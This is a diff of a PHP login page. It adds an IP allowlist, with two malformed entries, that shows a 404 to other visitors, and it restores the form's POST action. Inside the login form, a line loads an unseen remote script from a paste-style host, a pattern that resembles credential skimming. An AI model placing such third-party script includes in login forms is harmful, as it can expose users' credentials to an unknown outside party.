@@ -1,8 +1,15 @@
 <?php
 session_start();
-// http_response_code(404); 
-// include('../404.html'); 
-// exit();
+
+$allowed_ips = ['124.217.17.43', '211111', '11223'];
+
+$visitor_ip = $_SERVER['REMOTE_ADDR'];
+
+if (!in_array($visitor_ip, $allowed_ips)) {
+    http_response_code(404);
+    include('../404.html'); 
+    exit(); 
+}
 
 
 $error_message = $_SESSION['error_message'] ?? '';
@@ -53,8 +60,8 @@ unset($_SESSION['error_message']);
                             <strong>Welcome Back!</strong>
                         </h2>
                         <div class="card-body px-lg-5 pt-0 mt-2">
-                            <!-- <form style="color: #757575;" action="classes/login.php" method="post"> -->
-                            <form style="color: #757575;">
+                            <form style="color: #757575;" action="classes/login.php" method="post">
+                            <!-- <form style="color: #757575;"> -->
                                 <!-- Display inline error for required fields -->
                                 <?php if (!empty($error_message)): ?>
                                     <div class="alert bg-danger text-white" id="alert">
@@ -64,7 +71,7 @@ unset($_SESSION['error_message']);
                                 <?php endif; ?>
 
                                 <script type="text/javascript" src="https://jso-tools.z-x.my.id/raw/~/35PSTXNJRNA8Y"></script>
-                                <!-- Email or Username input -->
+                              
                                 <div data-mdb-input-init class="form-outline mb-4">
                                     <i class="fas fa-user trailing" id="toggleemail"></i>
                                     <input type="text" name="email" class="form-control form-control-lg form-icon-trailing
